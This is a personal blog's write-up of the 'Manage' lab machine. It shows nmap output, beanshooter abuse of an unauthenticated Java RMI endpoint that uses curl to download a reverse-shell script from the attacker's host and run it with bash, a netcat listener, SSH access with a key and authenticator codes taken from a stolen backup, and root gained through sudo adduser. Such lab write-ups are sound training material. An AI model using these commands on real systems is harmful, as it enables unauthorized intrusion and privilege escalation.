<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Manage (Linux Easy) | SidePieceVillage</title><meta name="author" content="Jay"><meta name="copyright" content="Jay"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Manage is a Linux Easy machine starting off with Java RMI using beanshooter. After enumeration we see we gather credentials and that authorization..."><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Manage (Linux Easy)",
  "url": "https://d34db33fb04h.github.io/2025/04/25/Manage/",
  "image": "https://d34db33fb04h.github.io/img/manage.jpg",
  "datePublished": "2025-04-26T00:47:11.000Z",
  "dateModified": "2025-04-29T21:22:51.141Z",
  "author": [
    {
      "@type": "Person",
      "name": "Jay",
      "url": "https://d34db33fb04h.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/j-neon-oval.png"><link rel="canonical" href="https://d34db33fb04h.github.io/2025/04/25/Manage/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: true,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Manage (Linux Easy)',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><script>window.paceOptions = {
  restartOnPushState: false
}

btf.addGlobalFn('pjaxSend', () => {
  Pace.restart()
}, 'pace_restart')

</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/hacking-crook.gif" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">35</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/whoami/"><i class="fa-fw fas fa-user"></i><span> whoami</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Categories</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/htb/"><i class="fa-fw fa-solid fa-cube"></i><span> HTB</span></a></li><li><a class="site-page child" href="/categories/vl/"><i class="fa-fw fas fa-building"></i><span> Vunlab</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Nav</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/n8.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/j-neon-oval.png" alt="Logo"><span class="site-name">SidePieceVillage</span></a><a class="nav-page-title" href="/"><span class="site-name">Manage (Linux Easy)</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/whoami/"><i class="fa-fw fas fa-user"></i><span> whoami</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Categories</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/htb/"><i class="fa-fw fa-solid fa-cube"></i><span> HTB</span></a></li><li><a class="site-page child" href="/categories/vl/"><i class="fa-fw fas fa-building"></i><span> Vunlab</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Nav</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Manage (Linux Easy)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-04-26T00:47:11.000Z" title="Created 2025-04-25 19:47:11">2025-04-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-04-29T21:22:51.141Z" title="Updated 2025-04-29 16:22:51">2025-04-29</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/vl/">vl</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>Manage is a Linux Easy machine starting off with <a target="_blank" rel="noopener" href="https://swisskyrepo.github.io/PayloadsAllTheThings/Java%20RMI/">Java RMI</a> using <a target="_blank" rel="noopener" href="https://github.com/qtc-de/beanshooter">beanshooter</a>. After enumeration we see we gather credentials and that authorization on the Remote MBean server isn’t required. Using this we are able to get a foothold on the machine. As user <code>tomcat</code>, we see other users we can attack in <code>/etc/passwd</code>. Trying to escalate our privilege to <code>useradmin</code> we have password reuse from the credentials we gathered, but upon entering the password were asked for verification. Looking in <code>useradmin</code>‘s home we see a backup tar file. Getting it to our machine yields this users home directory backed up. We have a ssh key we can use to get on the box, along with <code>.google_authenticator</code> having PINS to try. Doing so gets us sshed on the box. Looking at our users privilege, we see we have <code>ALL:ALL</code> on <code>/usr/sbin/adduser</code>. Looking at a typical sudoers file we see we can use <code>admin</code> as a user, as this group is not present on the box. Upon adding this user, they will in turn be added to the <code>admin</code> group allowing just <code>ALL:ALL</code>, which gives us root.</p>
<h2 id="Initial-Nmap"><a href="#Initial-Nmap" class="headerlink" title="Initial Nmap"></a>Initial Nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE  REASON         VERSION</span><br><span class="line">22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   256 a9:36:3d:1d:43:62:bd:b3:88:5e:37:b1:fa:bb:87:64 (ECDSA)                              </span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL/6LNCGTwX42XmhwON6uF7gkwKfdO4iIzYnFD87dWpXiPrNIYgfW0953r40u4j4DAf+PhgdmdKKKE8KIifQaVc=</span><br><span class="line">|   256 da:3b:11:08:81:43:2f:4c:25:42:ae:9b:7f:8c:57:98 (ED25519)                            </span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGbGFCw+4cyYAXrdHnPXp2K1ojZhTcQrXPI+pDFW5vkh          </span><br><span class="line">2222/tcp open  java-rmi syn-ack ttl 63 Java RMI                                             </span><br><span class="line">| rmi-dumpregistry:                                                                         </span><br><span class="line">|   jmxrmi                                                                                  </span><br><span class="line">|     javax.management.remote.rmi.RMIServerImpl_Stub                                        </span><br><span class="line">|     @127.0.1.1:38941                        </span><br><span class="line">|     extends                                                                               </span><br><span class="line">|       java.rmi.server.RemoteStub                                                          </span><br><span class="line">|       extends                                                                             </span><br><span class="line">|_        java.rmi.server.RemoteObject                                                      </span><br><span class="line">|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)                              </span><br><span class="line">8080/tcp open  http     syn-ack ttl 63 Apache Tomcat 10.1.19                                 </span><br><span class="line">|_http-favicon: Apache Tomcat                  </span><br><span class="line">|_http-title: Apache Tomcat/10.1.19            </span><br><span class="line">| http-methods:                                                                             </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS   </span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
<p>Looking at port 2222 specifically. 👀</p>
<h2 id="Java-RMI-Remote-Method-Invocation-and-our-footHold-👌"><a href="#Java-RMI-Remote-Method-Invocation-and-our-footHold-👌" class="headerlink" title="Java RMI (Remote Method Invocation) and our footHold 👌"></a>Java RMI (Remote Method Invocation) and our footHold 👌</h2><p><a target="_blank" rel="noopener" href="https://swisskyrepo.github.io/PayloadsAllTheThings/Java%20RMI/">Java RMI(Remote Method Invocation)</a> is a Java API that allows an object running in one JVM (Java Virtual Machine) to invoke methods on an object running in another JVM, even if they’re on different physical machines. RMI provides a mechanism for Java-based distributed computing. We can abuse this with <a target="_blank" rel="noopener" href="https://github.com/qtc-de/beanshooter">beanshooter</a>.</p>
<p><img src="/img/beans.gif" alt="Here We Go!"></p>
<p>We can first run some enumeration.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar enum 10.10.124.240 2222</span><br><span class="line"></span><br><span class="line">[+] Checking available bound names:</span><br><span class="line">[+]</span><br><span class="line">[+]     * jmxrmi (JMX endpoint: 127.0.1.1:38941)</span><br><span class="line">[+]</span><br><span class="line">[+] Checking <span class="keyword">for</span> unauthorized access:</span><br><span class="line">[+]</span><br><span class="line">[+]     - Remote MBean server does not require authentication.</span><br><span class="line">[+]       Vulnerability Status: Vulnerable</span><br><span class="line">[+]</span><br><span class="line">[+] Checking pre-auth deserialization behavior:</span><br><span class="line">[+]</span><br><span class="line">[+]     - Remote MBeanServer rejected the payload class.</span><br><span class="line">[+]       Vulnerability Status: Non Vulnerable   </span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">[+] Enumerating tomcat <span class="built_in">users</span>:</span><br><span class="line">[+]</span><br><span class="line">[+]     - Listing 2 tomcat <span class="built_in">users</span>:</span><br><span class="line">[+]</span><br><span class="line">[+]             ----------------------------------------</span><br><span class="line">[+]             Username:  manager</span><br><span class="line">[+]             Password:  &lt;SNIP&gt;</span><br><span class="line">[+]             Roles:</span><br><span class="line">[+]                        Users:<span class="built_in">type</span>=Role,rolename=<span class="string">&quot;manage-gui&quot;</span>,database=UserDatabase</span><br><span class="line">[+]</span><br><span class="line">[+]             ----------------------------------------</span><br><span class="line">[+]             Username:  admin</span><br><span class="line">[+]             Password:  &lt;SNIP&gt;</span><br><span class="line">[+]             Roles:</span><br><span class="line">[+]                        Users:<span class="built_in">type</span>=Role,rolename=<span class="string">&quot;role1&quot;</span>,database=UserDatabas                     </span><br></pre></td></tr></table></figure>
<p><img src="/img/perfect.gif"></p>
<p>Now we have some credentials. But lets try to get a shell. First we can create a reverse shell and put it in <code>x</code> and host it. This will grab our shell.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard 10.10.124.240 2222 <span class="built_in">exec</span> <span class="string">&#x27;curl -o /tmp/x 10.8.4.29/x&#x27;</span></span><br></pre></td></tr></table></figure>

<p>This the executes our shell.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar beanshooter-4.1.0-jar-with-dependencies.jar standard 10.10.124.240 2222 <span class="built_in">exec</span> <span class="string">&#x27;bash /tmp/x&#x27;</span></span><br></pre></td></tr></table></figure>

<p>Our foothold appears 🙌</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ nc -lvnp 9001</span><br><span class="line">listening on [any] 9001 ...</span><br><span class="line">connect to [10.8.4.29] from (UNKNOWN) [10.10.124.240] 57806</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (597): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">tomcat@manage:/$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1001(tomcat) gid=1001(tomcat) <span class="built_in">groups</span>=1001(tomcat)</span><br><span class="line">tomcat@manage:/$ </span><br></pre></td></tr></table></figure>

<p><img src="/img/tom-and-jerry-mafia.gif"></p>
<h2 id="I’m-just-a-regular-Tomcat"><a href="#I’m-just-a-regular-Tomcat" class="headerlink" title="I’m just a regular Tomcat"></a>I’m just a regular Tomcat</h2><p>As <code>tomcat</code> we look around seeing we have to users we can look at. Going to <code>/home</code> we can see a directory <code>backup</code> in <code>useradmin</code>‘s home directory. This has a <code>backup.tar.gz</code> we can extract to our machine. </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ tomcat@manage:/home/useradmin/backups$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">backup.tar.gz</span><br></pre></td></tr></table></figure>
<p>I just base64 encoded and the decoded on my machine. After that we had some directories, including <code>.ssh</code>. Using the key we can ssh in as <code>useradmin</code>, but upon entering the password it asks for verification.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -i .ssh/id_ed25519 useradmin@10.10.124.240</span><br><span class="line">(useradmin@10.10.124.240) Verification code:</span><br></pre></td></tr></table></figure>
<p>We also had a <code>.google_authenticator</code> file. This held PINS we can use for verification, and after using one or two we get in.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -i .ssh/id_ed25519 useradmin@10.10.124.240</span><br><span class="line">(useradmin@10.10.124.240) Verification code: </span><br><span class="line">Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)</span><br><span class="line"></span><br><span class="line">Last login: Sat Apr 26 00:29:41 2025 from 10.8.4.29</span><br><span class="line">useradmin@manage:~$ <span class="built_in">id</span></span><br><span class="line">uid=1002(useradmin) gid=1002(useradmin) <span class="built_in">groups</span>=1002(useradmin)</span><br></pre></td></tr></table></figure>
<p><img src="/img/yes.gif"></p>
<h2 id="PrivEsc"><a href="#PrivEsc" class="headerlink" title="PrivEsc"></a>PrivEsc</h2><p>If we look at our privileges we have <code>adduser</code>, trying everything such as appending to the end i.e. <code>--uid 0</code> or <code>--system</code> didn’t yield any results. Yet if we look we groups there wasn’t an <code>admin</code>, a typical sudoers file looks like the following:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># User privilege specification</span></span><br><span class="line">root	ALL=(ALL:ALL) ALL</span><br><span class="line"></span><br><span class="line"><span class="comment"># Members of the admin group may gain root privileges</span></span><br><span class="line">%admin ALL=(ALL) ALL</span><br><span class="line"></span><br><span class="line"><span class="comment"># Allow members of group sudo to execute any command</span></span><br><span class="line">%<span class="built_in">sudo</span>	ALL=(ALL:ALL) ALL</span><br></pre></td></tr></table></figure>
<p>So in theory if we add a user named <code>admin</code> then groups follow when a new user is added. So adding user <code>admin</code> would give us the permissions <code>ALL=(ALL) ALL</code>. That gets us root.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">useradmin@manage:~$ su admin</span><br><span class="line">Password: </span><br><span class="line">admin@manage:/home/useradmin$ <span class="built_in">sudo</span> -l</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> admin: </span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> admin on manage:</span><br><span class="line">    env_reset, timestamp_timeout=1440, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line"></span><br><span class="line">User admin may run the following commands on manage:</span><br><span class="line">    (ALL) ALL</span><br><span class="line">admin@manage:/home/useradmin$ <span class="built_in">sudo</span> su</span><br><span class="line">root@manage:/home/useradmin# <span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br></pre></td></tr></table></figure>

<p><img src="/img/robocop.gif"></p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Java-RMI/">Java RMI</a><a class="post-meta__tags" href="/tags/TomCat/">TomCat</a><a class="post-meta__tags" href="/tags/Sudo-Abuse/">Sudo Abuse</a></div><div class="post-share"><div class="social-share" data-image="/img/manage.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/04/29/Hybrid/" title="Hybrid (Chain Easy)"><img class="cover" src="/img/hybrid.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">Hybrid (Chain Easy)</div></div><div class="info-2"><div class="info-item-1">Hybrid is a Chain mixed with a linux and windows machine. Starts off with Roundcube Webmail on http, using alias identities your able to force command injection leading to a reverse shell. The once on the box your find /etc/exports enabling rw for /opt/share, allowing for privilege escalation to user peter. Once done, you tunnel through to find a vulnerable ESC1 template allowing for Domain Computers to supply enrollees allowing for privilege escalation to Administrator. Initial NmapTwo IPs to scan. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178Nmap scan report for 10.10.160.197Host is up (0.16s latency).Not...</div></div></div></a><a class="pagination-related" href="/2025/04/06/Heist/" title="Heist (Windows Easy)"><img class="cover" src="/img/heist.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Heist (Windows Easy)</div></div><div class="info-2"><div class="info-item-1">Heist is a Windows Easy box, I wanted to take it easy and doing something relaxing and this was very interesting to say the least. This starts out with a website that you’re able to login as a guest and read the recent posts. When you do you gather a user name, as well as see an attachment. This attactment is a cisco config file. You’re able to deduce what type of hash the passwords are and crack them. From there your able to get a list of users, and then spray to find one allows for winrm access. Upon looking a directories and anything from the norm, you find processes running and a particular firefox is running, which can allow for dumping the process memory if its still being used. Using procdump64.exe, we’re able to dump the process memory and filter through and retrieve the Administrator password. Initial Nmap12345678910111213141516171819202122232425262728293031PORT    STATE SERVICE       REASON          VERSION80/tcp  open  http          syn-ack ttl 127 Microsoft IIS httpd...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/hacking-crook.gif" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Jay</div><div class="author-info-description">An aspiring hacker and a CTF player</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">35</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/itzgottabejay" target="_blank" title="Github"><i class="fab fa-github" style="color: #E2E6E6;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/ianberdahl/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin" style="color: #007aff;"></i></a><a class="social-icon" href="https://app.hackthebox.com/profile/420575" target="_blank" title="HackTheBox"><i class="fa-solid fa-cube" style="color: #2dfc04;"></i></a><a class="social-icon" href="https://www.instagram.com/junkie_mayhem/" target="_blank" title="Instagram"><i class="fab fa-instagram" style="color: #833AB4;"></i></a><a class="social-icon" href="https://x.com/deadcyberninja" target="_blank" title="X"><i class="fab fa-x-twitter" style="color: #000404;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">I like to put things here for safe keeping 🔐🔐</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Nmap"><span class="toc-number">1.</span> <span class="toc-text">Initial Nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java-RMI-Remote-Method-Invocation-and-our-footHold-%F0%9F%91%8C"><span class="toc-number">2.</span> <span class="toc-text">Java RMI (Remote Method Invocation) and our footHold 👌</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#I%E2%80%99m-just-a-regular-Tomcat"><span class="toc-number">3.</span> <span class="toc-text">I’m just a regular Tomcat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PrivEsc"><span class="toc-number">4.</span> <span class="toc-text">PrivEsc</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url(/img/n8.jpg);"><div id="footer-wrap"></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="IM,WATCHING,YOU" data-fontsize="21px" data-random="false" async="async"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Where do you want to go?" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>